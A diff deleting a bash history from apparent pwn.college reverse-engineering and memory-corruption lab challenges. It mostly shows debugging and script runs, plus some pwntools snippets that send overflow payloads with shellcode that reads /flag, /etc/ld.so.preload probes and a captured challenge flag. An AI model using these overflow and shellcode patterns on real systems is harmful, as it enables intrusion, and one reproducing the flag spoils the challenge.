@@ -1,1006 +1,430 @@
-  644  gdb /challenge/babyrev_level11.1
-  645  /challenge/babyrev_level11.1
-  646  vim bb.py 
-  647  python bb.py 
-  648  cat ttt-raw | /challenge/babyrev_level12.0 
-  649  vim bb.py 
-  650  python bb.py 
-  651  cat ttt-raw | /challenge/babyrev_level12.0 
-  652  cat ttt-raw | /challenge/babyrev_level12.1
-  653  gdb /challenge/babyrev_level13.0
-  654  /challenge/babyrev_level13.0
-  655  vim bb.py 
-  656  python bb.py 
-  657  cat ttt-raw | /challenge/babyrev_level13.0
-  658  /challenge/babyrev_level13.1
-  659  vim bb.py 
-  660  python bb.py 
-  661  cat ttt-raw | /challenge/babyrev_level13.1
-  662  /challenge/babyrev_level14.0 
-  663  vim bb.py 
-  664  python bb.py 
-  665  vim bb.py 
-  666  python bb.py 
-  667  cat ttt-raw | /challenge/babyrev_level14.0
-  668  /challenge/babyrev_level14.1
-  669  vim bb.py 
-  670  python bb.py 
-  671  cat ttt-raw | /challenge/babyrev_level14.1 
-  672  /challenge/babyrev_level15.0 
-  673  ls
-  674  cd leap/
-  675  ls
-  676  cd ..
-  677  cd Desktop/
-  678  ls
-  679  cd ..
-  680  vim bb.py 
-  681  python bb.py 
-  682  cat ttt-raw | /challenge/babyrev_level15.0
-  683  /challenge/babyrev_level15.1 
-  684  vim bb.py 
-  685  python bb.py 
-  686  cat ttt-raw | /challenge/babyrev_level15.1
-  687  /challenge/babyrev_level16.0 
-  688  vim bb.py 
-  689  python3 bb.py 
-  690  /challenge/babyrev_level16.1
-  691  vim bb.py 
-  692  python3 bb.py 
-  693  /challenge/babyrev_level17.0
-  694  /challenge/babyrev_level17.0 
-  695  vim bb.py 
-  696  python3 bb.py 
-  697  vim bb.py 
-  698  clear
-  699  vim bb.py 
-  700  python3 bb.py 
-  701  vim bb.py 
-  702  python3 bb.py 
-  703  vim bb.py 
-  704  python3 bb.py 
-  705  vim bb.py 
-  706  python3 bb.py 
-  707  vim bb.py 
-  708  python3 bb.py 
-  709  vim bb.py 
-  710  python3 bb.py 
-  711  vim bb.py 
-  712  python3 bb.py 
-  713  vim bb.py 
-  714  python3 bb.py 
-  715  vim bb.py 
-  716  python3 bb.py 
-  717  vim bb.py 
-  718  python3 bb.py 
-  719  vim bb.py 
-  720  python3 bb.py 
-  721  vim bb.py 
-  722  python3 bb.py 
-  723  vim bb.py 
-  724  python3 bb.py 
-  725  vim bb.py 
-  726  python3 bb.py 
-  727  vim bb.py 
-  728  python3 bb.py 
-  729  /challenge/babyrev_level17.1 
-  730  vim bb.py 
-  731  python3 bb.py 
-  732  vim bb.py 
-  733  python3 bb.py 
-  734  /challenge/babyrev_level18.0 
-  735  vim bb.py 
-  736  python3 bb.py 
-  737  vim bb.py 
-  738  python3 bb.py 
-  739  ls
-  740  vim bb.py 
-  741  python3 bb.py 
-  742  /challenge/babyrev_level19.0
-  743  /challenge/babyrev_level19.0 
-  744  exit
-  745  ls
-  746  /challenge/babyrev_level19.0 
-  747  strace /challenge/babyrev_level19.0 
-  748  /challenge/babyrev_level19.0 
-  749  exit
-  750  gdb /challenge/babyrev_level19.0 
-  751  ls
-  752  gdb /challenge/babyrev_level19.0 
-  753  aa
-  754  gdb /challenge/babyrev_level19.0 
-  755  /challenge/babyrev_level19.0 
-  756  $$$$$$$$$$$$
-  757  /challenge/babyrev_level19.0 
-  758  vim 19.0writeup.py
-  759  python3 19.0writeup.py | /challenge/babyrev_level19.0 
-  760  ls
-  761  vim bb.py 
-  762  cat bb.py 
-  763  vim 19.0writeup.py 
-  764  python 19.0writeup.py 
-  765  vim 19.0writeup.py 
-  766  python 19.0writeup.py 
-  767  clear
-  768  /challenge/babyrev_level19.1 
-  769  vim 19.1writeup.py
-  770  python3 19.1writeup.py 
-  771  vim 19.1writeup.py
-  772  python3 19.1writeup.py 
-  773  /challenge/babyrev_level20.0 
-  774  vim 20-0.py
-  775  python3 20-0.py
-  776  vim 20-0.py
-  777  python3 20-0.py
-  778  vim 20-0.py
-  779  python3 20-0.py
-  780  vim 20-0.py
-  781  python3 20-0.py
-  782  vim 20-0.py
-  783  python3 20-0.py
-  784  vim 20.1.py
-  785  python3 20.1.py
-  786  exit
-  787  vim 21.0.py
-  788  python3 21.0.py
-  789  vim 21.0.py
-  790  python3 21.0.py
-  791  vim 21.0.py 
-  792  python3 21.0.py 
-  793  clera
-  794  vim 21.0.py 
-  795  clear
-  796  python3 21.0.py 
-  797  rm 21.0.py 
-  798  vim 21.0.py
-  799  python3 21.0.py 
-  800  vim 21.0.py
-  801  rm 21.0.py 
-  802  vim 21.0.py
-  803  python3 21.0.py 
-  804  rm 21.0.py 
-  805  vim 21.0.py
-  806  python3 21.0.py 
-  807  vim ./21.0.asm
-  808  python3 21.0.py 
-  809  vim 21.0.py 
-  810  vim 21.0.asm
-  811  python3 21.0.py 
-  812  vim 21.0.asm
-  813  python3 21.0.py 
-  814  vim 21.0.asm
-  815  python3 21.0.py 
-  816  vim 21.1.py
-  817  python3 21.1.py 
-  818  vim 21.1.py
-  819  python3 21.1.py 
-  820  /challenge/babyrev_level22.0 
-  821  vim 22.0.py
-  822  rm ttt.out 
-  823  vim 22.0.py 
-  824  tail -f ttt.out
-  825  python3 22.0.py 
-  826  vim 22.0.py 
-  827  python3 22.0.py 
-  828  vim 22.0.py 
-  829  python3 22.0.py 
-  830  vim 22.0.py 
-  831  python3 22.0.py 
-  832  vim 22.0.py 
-  833  python3 22.0.py 
-  834  vim 22.0.py 
-  835  python3 22.0.py 
-  836  vim 22.0.py 
-  837  python3 22.0.py 
-  838  vim 22.0.py 
-  839  tail -f ttt.out 
-  840  python3 22.0.py 
-  841  vim 22.0.py 
-  842  rm ttt.out 
-  843  vim 22.0.py
-  844  vim 22.0writeup.py
-  845  python3 22.0writeup.py 
-  846  vim 22.0writeup.py 
-  847  python 22.0writeup.py 
-  848  cat ttt-raw | /challenge/babyrev_level22.0 
-  849  vim 22.0writeup.py 
-  850  python 22.0writeup.py 
-  851  vim 21.0.asm 
-  852  python 22.0writeup.py 
-  853  gdb /challenge/babyrev_level22.1 
-  854  /challenge/babyrev_level22.1 
-  855  cat ttt-raw | /challenge/babyrev_level22.1 
-  856  vim 22.1.py
-  857  python3 22.1.py 
-  858  vim 22.1.py 
-  859  python3 22.1.py 
-  860  vim 22.1.py 
-  861  python3 22.1.py 
-  862  vim 22.1.py 
-  863  python3 22.1.py 
-  864  vim 22.1.py 
-  865  python3 22.1.py 
-  866  vim 22.1.py 
-  867  python3 22.1.py 
-  868  vim 22.1.py 
-  869  python3 22.1.py 
-  870  vim 22.1.py 
-  871  python3 22.1.py 
-  872  vim 22.1.py 
-  873  python3 22.1.py > 0x01.out
-  874  ls
-  875  python3 22.1.py > 0x01.out
-  876  hexedit ./ttt-raw 
-  877  cat ./ttt-raw | /challenge/babyrev_level22.1 
-  878  vim 22.1.py 
-  879  :wq
-  880  python3 22.1.py > 0x02.out
-  881  vim 22.1.py 
-  882  python3 22.1.py > 0x04.out
-  883  tail -f 0x04.out 
-  884  vim 22.1.py 
-  885  tail -f 0x08.out 
-  886  python3 22.1.py > 0x08.out
-  887  python3 22.1.py
-  888  python3 22.1.py > 0x10.out
-  889  python3 22.1.py > 0x20.out
-  890  python3 22.1.py > 0x40.out
-  891  hexedit ttt-raw 
-  892  cat ttt-raw | /challenge/babyrev_level22.1 
-  893  python3 22.1.py > 0x80.out
-  894  tail -f 0x80.out 
-  895  python3 22.1.py
-  896  vim 22.1.py 
-  897  python3 22.1.py
-  898  clear
-  899  python3 22.1.py
-  900  cat ttt-raw | /challenge/babyrev_level22.1 
-  901  cat $?
-  902  cat ?
-  903  echo ?
-  904  echo $?
-  905  cat ttt-raw | /challenge/babyrev_level22.1 
-  906  echo $?
-  907  cat ttt-raw | /challenge/babyrev_level22.1 
-  908  python3 22.1.py
-  909  python3 22.1writeup.py 
-  910  vim 22.1writeup.py 
-  911  python3 22.1writeup.py 
-  912  vim 22.1writeup.py 
-  913  python3 22.1writeup.py 
-  914  vim 22.1writeup.py 
-  915  python3 22.1writeup.py 
-  916  vim 22.1writeup.py 
-  917  vim 22.1.asm
-  918  python3 22.1writeup.py 
-  919  vim 22.1.asm
-  920  python3 22.1writeup.py 
-  921  vim 22.1.asm
-  922  python3 22.1writeup.py 
-  923  ls /flag 
-  924  vim 22.1writeup.py 
-  925  python3 22.1writeup.py 
-  926  ls /challenge/babyrev_level22.1 -al
-  927  cat ttt-raw | /challenge/babyrev_level22.1 
-  928  strace /challenge/babyrev_level22.1 
-  929  python3 22.1writeup.py 
-  930  cd ~
-  931  python3 22.1writeup.py 
-  932  cd ..
-  933  python3 /home/hacker/22.1writeup.py 
-  934  /challenge/babymem_level1.0 
-  935  /challenge/babymem_level1.1 
-  936  AAAAA
-  937  /challenge/babymem_level1.1 
-  938  objdump /challenge/babymem_level1.1 
-  939  objdump /challenge/babymem_level1.1  -d
-  940  objdump /challenge/babymem_level1.1  -d > /home/hacker/babymem_level1.1.asm
-  941  /challenge/babymem_level1.1
-  942  AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-  943  /challenge/babymem_level1.1
-  944  /challenge/babymem_level2.0 
-  945  MscjNwIzW}pwn.college{AuhafAMeSrmXYKio1gVG_xF3jgE.QXwkjMscjNwIzW}pwn.college{AuhafAMeSrmXYKio1gVG_xF3jgE.QXwkjMscjNwIzW}pwn.college{AuhafAMeSrmXYKio1gVG_xF3jgE.QXwkjMscjNwIzW}
-  946  /challenge/babymem_level2.0 
-  947  objdump /challenge/babymem_level2.0  -d > /home/hacker/babymem_level2.0.asm
-  948  objdump /challenge/babymem_level2.1  -d > /home/hacker/babymem_level2.1.asm
-  949  /challenge/babymem_level3.0 
-  950  objdump /challenge/babymem_level3.0  -d > /home/hacker/babymem_level3.0.asm
-  951  objdump /challenge/babymem_level3.1  -d > /home/hacker/babymem_level3.1.asm
-  952  objdump /challenge/babymem_level4.0  -d > /home/hacker/babymem_level4.0.asm
-  953  /challenge/babymem_level4.0 
-  954  python3
-  955  /challenge/babymem_level5.0 
-  956  aaaaaaaaaaaaaaaaaa
-  957  /challenge/babymem_level5.0 
-  958  /challenge/babymem_level6.0 
-  959  python3
-  960  /challenge/babymem_level6.0 
-  961  python3
-  962  /challenge/babymem_level6.0 
-  963  python3
-  964  /challenge/babymem_level6.1 
-  965  python3
-  966  ls core 
-  967  gdb ./core 
-  968  ls -al core
-  969  rm core
-  970  gdb =p 163
-  971  gdb -p 163
-  972  python3
-  973  python3
-  974  tmux splitw -h
-  975  tmux splitw
-  976  exit
-  977  tmux
-  978  hacker@memory-errors~level6-1:~$ tmux
-  979  tmux new-window -F '#{pane_pid}' -P bash
-  980  tmux
-  981  exit
-  982  tmux
-  983  /challenge/babymem_level7.0 
-  984  objdump -d /challenge/babymem_level7.0 
-  985  /challenge/babymem_level7.0 
-  986  python3
-  987  vim 7.0.py
-  988  python3 7.0.py 
-  989  vim 7.0.py 
-  990  python3 7.0.py 
-  991  vim 7.0.py 
-  992  python3 7.0.py 
-  993  vim 7.0.py 
-  994  python3 7.0.py 
-  995  vim 7.0.py 
-  996  python3 7.0.py 
-  997  vim 7.0.py 
-  998  python3 7.0.py 
-  999  vim 7.0.py 
- 1000  python3 7.0.py 
- 1001  strings /challenge/babymem_level7.0  | grep "You win"
- 1002  vim 7.0.py 
- 1003  python3 7.0.py 
- 1004  vim 7.0.py 
- 1005  python3 7.0.py 
- 1006  vim 7.0.py 
- 1007  python3 7.0.py 
- 1008  vim 7.0.py 
- 1009  python3 7.0.py 
- 1010  vim 7.0.py 
- 1011  python3 7.0.py 
- 1012  vim 7.0.py 
- 1013  python3 7.0.py 
- 1014  vim 7.0.py 
- 1015  python3 7.0.py 
- 1016  /challenge/babymem_level8.0 
- 1017  objdump -d /challenge/babymem_level8.0 
- 1018  /challenge/babymem_level8.0 
- 1019  vim 7.0.py 
- 1020  python3 7.0.py 
- 1021  vim 7.0.py 
- 1022  python3 7.0.py 
- 1023  vim 7.0.py 
- 1024  python3 7.0.py 
- 1025  vim 7.0.py 
- 1026  python3 7.0.py 
- 1027  /challenge/babymem_level8.1 
- 1028  vim 7.0.py 
- 1029  python3 7.0.py 
- 1030  /challenge/babymem_level9.0 
- 1031  AAAAAAAAAAAAAAAAAAAAAAAAAAA
- 1032  vim 9.0.py
- 1033  python3 9.0.py 
- 1034  vim 9.0.py
- 1035  python3 9.0.py 
- 1036  vim 9.0.py
- 1037  python3 9.0.py 
- 1038  /challenge/babymem_level9.0 
- 1039  vim 9.0.py
- 1040  python3 9.0.py 
- 1041  vim 9.0.py
- 1042  python3 9.0.py 
- 1043  vim 7.0.py 
- 1044  python3 7.0.py 
- 1045  vim 7.0.py 
- 1046  python3 7.0.py 
- 1047  /challenge/babymem_level9.1 
- 1048  AA
- 1049  rm 9.0.py 
- 1050  check /challenge/babymem_level9.1 
- 1051  checksec /challenge/babymem_level9.1 
- 1052  vim 7.0.py 
- 1053  python3 7.0.py 
- 1054  /challenge/babymem_level10.0 
- 1055  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
- 1056  /challenge/babymem_level11.0 
- 1057  ipython3
- 1058  /challenge/babymem_level12.0 
- 1059  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
- 1060  /challenge/babymem_level12.0 
- 1061  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
- 1062  clear
- 1063  /challenge/babymem_level12.0 
- 1064  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
- 1065  /challenge/babymem_level12.0 
- 1066  AA
- 1067  ipython3
- 1068  cookie = int(cookie)
- 1069  ipython3
- 1070  /challenge/babymem_level12.0 
- 1071  ipython
- 1072  clear
- 1073  ls
- 1074  clear
- 1075  ipython
- 1076  clear
- 1077  ipython
- 1078  clear
- 1079  /challenge/babymem_level13.0 
- 1080  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
- 1081  /challenge/babymem_level13.1
- 1082  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
- 1083  /challenge/babymem_level14.0 
- 1084  ipython
- 1085  clear
- 1086  ipython
- 1087  /challenge/babymem_level14.0 
- 1088  ipython
- 1089  clear
- 1090  from pwn import *
- 1091  while True:;     p = process("/challenge/babymem_level14.0")
- 1092  clear
- 1093  /challenge/babymem_level15.0 
- 1094  ipython
- 1095  clear
- 1096  ipython
- 1097  clear
- 1098  ipython
- 1099  /challenge/babymem_level15.0 
- 1100  ipython
- 1101  vim 19.0writeup.py 
- 1102  python3 19.0writeup.py 
- 1103  ls /challenge/
- 1104  /challenge/toddlerone_level1.0 
- 1105  ls
- 1106  ls /challenge/
- 1107  /challenge/toddlerone_level1.0 
- 1108  ipython
- 1109  from pwn import *
- 1110  context.arch = "amd64"
- 1111  my_sc = asm(shellcraft.cat("/flag"))
- 1112  # display the bytes
- 1113  print(disasm(my_sc))
- 1114  p = process("/challenge/toddlerone_level1.0")
- 1115  p.send(my_sc)
- 1116  p.sendline(b"100")
- 1117  ret = 0x2f2e7000
- 1118  p.send(b"A"*72 + ret.to_bytes(8,"little"))
- 1119  all = p.recvall()
- 1120  p.close()
- 1121  ipython
- 1122  /challenge/toddlerone_level1.0 
- 1123  ipython
- 1124  /challenge/toddlerone_level1.1 
- 1125  ipython
- 1126  /challenge/toddlerone_level1.1 
- 1127  ipython
- 1128  from pwn import *
- 1129  context.arch = "amd64"
- 1130  my_sc = asm(shellcraft.cat("/flag"))
- 1131  # display the bytes
- 1132  print(disasm(my_sc))
- 1133  #p = process("/challenge/toddlerone_level1.1")
- 1134  context.terminal = ['tmux', 'splitw', '-h']
- 1135  p = gdb.debug("/challenge/toddlerone_level1.1", gdbscript='continue')
- 1136  p.send(my_sc)
- 1137  p.recvuntil(b"Payload size: ")
- 1138  p.sendline(b"500")
- 1139  p.recvuntil(b"Send your payload")
- 1140  ret = 0x13CBF000
- 1141  p.send(b"A"*0x88 + ret.to_bytes(8,"little"))
- 1142  all = p.recvall(timeout=1)
- 1143  print(all.decode())
- 1144  p.close()
- 1145  ipython
- 1146  /challenge/toddlerone_level2.0 
- 1147  ipython
- 1148  cat /flag 
- 1149  from pwn import *
- 1150  context.arch = "amd64"
- 1151  my_sc = asm('''
- 1152  '''
- 1153  )
- 1154  # display the bytes
- 1155  print(disasm(my_sc))
- 1156  p = process("/challenge/toddlerone_level2.0")
- 1157  #context.terminal = ['tmux', 'splitw', '-h']
- 1158  #p = gdb.debug("/challenge/toddlerone_level1.1", gdbscript='continue')
- 1159  p.recvuntil(b"Payload size: ")
- 1160  p.sendline(b"500")
- 1161  p.recvuntil(b"Send your payload")
- 1162  ret = 0x7fffffffd240
- 1163  p.send(my_sc + b"A"*(72 - len(my_sc)) + ret.to_bytes(8,"little"))
- 1164  all = p.recvall(timeout=1)
- 1165  print(all.decode())
- 1166  p.close()
- 1167  ipython
- 1168  cat /flag 
- 1169  objdump -d /challenge/toddlerone_level2.1 
- 1170  ipython
- 1171  cat /flag 
- 1172  gdb /challenge/toddlerone_level2.1 
- 1173  ipython
- 1174  cat /flag 
- 1175  ipython
- 1176  cat /flag 
- 1177  gdb /challenge/toddlerone_level2.1 
- 1178  ipython
- 1179  cat /flag 
- 1180  ipython
- 1181  cat /flag 
- 1182  /challenge/toddlerone_level3.0 
- 1183  ipython
- 1184  /challenge/toddlerone_level3.0 
- 1185  clear
- 1186  ipython
- 1187  cat /flag 
- 1188  ipython
- 1189  cat /flag
- 1190  checksec /challenge/toddlerone_level3.0 
- 1191  strings /challenge/toddlerone_level3.0 | grep flag
- 1192  ipython
- 1193  clear
- 1194  ipython
- 1195  cat /flag 
- 1196  \
- 1197  /challenge/toddlerone_level3.0 
- 1198  ipython
- 1199  cat /flag
- 1200  /challenge/toddlerone_level4.0 
- 1201  ipython
- 1202  cat /flag 
- 1203  ipython
- 1204  cat /flag 
- 1205  ipython
- 1206  cat /flag 
- 1207  checksec /challenge/toddlerone_level5.0 
- 1208  ipython
- 1209  checksec /challenge/toddlerone_level5.0 
- 1210  ipython
- 1211  cat /flag 
- 1212  ipython
- 1213  cat /flag 
- 1214  ipython
- 1215  cat /flag 
- 1216  /challenge/toddlerone_level6.0 
- 1217  checksec /challenge/toddlerone_level6.0 
- 1218  strings /challenge/toddlerone_level6.0 | grep "flag"
- 1219  ipython
- 1220  cat /flag 
- 1221  clear
- 1222  ipython
- 1223  cat /flag 
- 1224  ipython
- 1225  cat /flag 
- 1226  ipython
- 1227  clear
- 1228  /challenge/toddlerone_level7.0 
- 1229  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
- 1230  /challenge/toddlerone_level7.0 
- 1231  checksec  /challenge/
- 1232  checksec  /challenge/toddlerone_level7.0 
- 1233  gdb /challenge/toddlerone_level7.0 
- 1234  /challenge/toddlerone_level7.0 
- 1235  ipython
- 1236  cat /flag 
- 1237  ipython
- 1238  clear
- 1239  ipython
- 1240  cat /flag 
- 1241  ipython
- 1242  cat /flag 
- 1243  /challenge/toddlerone_level8.0 
- 1244  checksec /challenge/toddlerone_level8.0 
- 1245  gdb /challenge/toddlerone_level8.0 
- 1246  /challenge/toddlerone_level8.0 
- 1247  ipython
- 1248  clear
- 1249  ipython
- 1250  clear
- 1251  ipython
- 1252  clear
- 1253  ipython
- 1254  clear
- 1255  gdb /challenge/toddlerone_level8.0 
- 1256  ipython
- 1257  cat /flag 
- 1258  ipython
- 1259  clear
- 1260  ipython
- 1261  clear
- 1262  ipython
- 1263  cat ttt-raw | /challenge/toddlerone_level8.1 
- 1264  ipython
- 1265  cat ttt-raw | /challenge/toddlerone_level8.1 
- 1266  cat ttt-raw |strace /challenge/toddlerone_level8.1 
- 1267  ipython
- 1268  cat ttt-raw |strace /challenge/toddlerone_level8.1 
- 1269  ipython
- 1270  cat ttt-raw |strace /challenge/toddlerone_level8.1 
- 1271  gdb /challenge/toddlerone_level8.1 
- 1272  ipython
- 1273  cat ttt-raw | strace /challenge/toddlerone_level8.1 
- 1274  cat ttt-raw |  /challenge/toddlerone_level8.1 
- 1275  ipython
- 1276  cat ttt-raw |  /challenge/toddlerone_level8.1 
- 1277  ipython
- 1278  clear
- 1279  cat /flag 
- 1280  /challenge/toddlerone_level9.0 
- 1281  ipython
- 1282  clear
- 1283  /challenge/toddlerone_level10.0 
- 1284  clear
- 1285  /challenge/toddlerone_level10.0 
- 1286  ipython
- 1287  clear
- 1288  ipython
- 1289  ls
- 1290  touch f
- 1291  /challenge/toddlerone_level10.0 < ./ttt-raw 57<&1 > ./test
- 1292  cat ./test
- 1293  ls -al ./tst
- 1294  ls -al ./ttest
- 1295  ls -al ./test
- 1296  cat ./test | grep "pwn"
- 1297  /challenge/toddlerone_level10.0 < ./ttt-raw <&1 > ./test
- 1298  /challenge/toddlerone_level10.0 < ./ttt-raw 3<&1 > ./test
- 1299  cat ./test | grep pwn
- 1300  ls -al
- 1301  ls -al /flag 
- 1302  rm ./test
- 1303  /challenge/toddlerone_level10.0 < ./ttt-raw 56<&1 > ./test
- 1304  cat ./test | grep "pwn"
- 1305  /challenge/toddlerone_level10.0 < ./ttt-raw 57<&1 > ./test
- 1306  /challenge/toddlerone_level10.0 < ./ttt-raw 57<&1
- 1307  /challenge/toddlerone_level10.0 < ./ttt-raw 57<&1 > ./test
- 1308  vim ./test
- 1309  rm ./test
- 1310  /challenge/toddlerone_level10.0 < ./ttt-raw 57<&1
- 1311  /challenge/toddlerone_level10.0 < ./ttt-raw 3>&1
- 1312  /challenge/toddlerone_level10.0 < ./ttt-raw 3>&1 > ./test
- 1313  cat ./test | grep "pwn"
- 1314  vim test.py
- 1315  strace test.py 
- 1316  which python
- 1317  vim test.py 
- 1318  strace test.py 
- 1319  strace ./test.py
- 1320  strace python ./test.py
- 1321  strace python ./test.py > test
- 1322  strace python ./test.py 1>&1 > test
- 1323  python ./test.py
- 1324  vim test.py
- 1325  python ./test.py
- 1326  ipython
- 1327  cat /flag 
- 1328  rm test
- 1329  vim test.py 
- 1330  strace python ./test.py > test 2>&1
- 1331  vim test
- 1332  ipython
- 1333  cat /flag 
- 1334  ls -al /flag 
- 1335  ipython
- 1336  cat /etc/ld.so.preload.o_create
- 1337  ipython
- 1338  sudo -i
- 1339  sudo
- 1340  cat /flag 
- 1341  sudo cat /flag 
- 1342  /challenge/
- 1343  ipython
- 1344  ls /etc/ld.so.prelod 
- 1345  vim /etc/ld.so.prelod 
- 1346  ls -al /etc/ld.so.prelod 
- 1347  ls -al /flag 
